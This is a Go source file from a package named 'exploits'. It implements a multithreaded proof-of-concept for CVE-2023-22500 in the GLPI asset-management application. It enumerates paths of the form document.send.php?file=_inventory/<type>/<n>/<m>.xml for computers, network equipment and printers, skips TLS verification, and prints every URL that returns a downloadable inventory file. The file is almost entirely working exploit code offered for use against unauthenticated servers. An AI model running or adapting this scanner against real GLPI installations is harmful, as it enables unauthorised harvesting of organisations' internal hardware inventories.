package exploits

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
)

/*
POC UNIQUEMENT SI unauth
GEN doss GLPI :
computer/x/0-999 if 1000 alors x=1
networkequipment/x/0-999 if 1000 alors x=1
printer/x/0-999 if 1000 alors x=1
*/

var itemtypes = []string{"computer", "networkequipment", "printer"}

func generateURLs(target string, itemtypes []string, minfolder int, maxfolder int, minfile int, maxfile int) []string {
	var urls []string
	for _, itemtype := range itemtypes {
		for h := minfolder; h < maxfolder+1; h++ {
			for i := minfile; i < maxfile+1; i++ {
				urls = append(urls, target+"/front/document.send.php?file=_inventory/"+itemtype+"/"+strconv.Itoa(h)+"/"+strconv.Itoa(i)+".xml")
			}
		}
	}
	return urls
}

func CVE202322500(target string, numRoutines int, minfolder int, maxfolder int, minfile int, maxfile int) {
	if CheckCVE202322500(target) {

		urls := generateURLs(target, itemtypes, minfolder, maxfolder, minfile, maxfile)

		urlChannel := make(chan string, len(urls))
		for _, url := range urls {
			urlChannel <- url
		}
		close(urlChannel)

		var wg sync.WaitGroup
		for i := 0; i < numRoutines; i++ {
			wg.Add(1)
			go worker(urlChannel, &wg)
		}
		wg.Wait()
	} else {
		os.Exit(1)
	}
}

func worker(urlChannel <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
	for url := range urlChannel {
		resp, err := client.Get(url)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}

		if err != nil {
			fmt.Println("Error while reading the response:", err)
		}

		if strings.Contains(resp.Header.Get("Content-disposition"), "attachment") {
			fmt.Println("Inventory File at: " + url)
		} /*else {

		}*/
	}
}
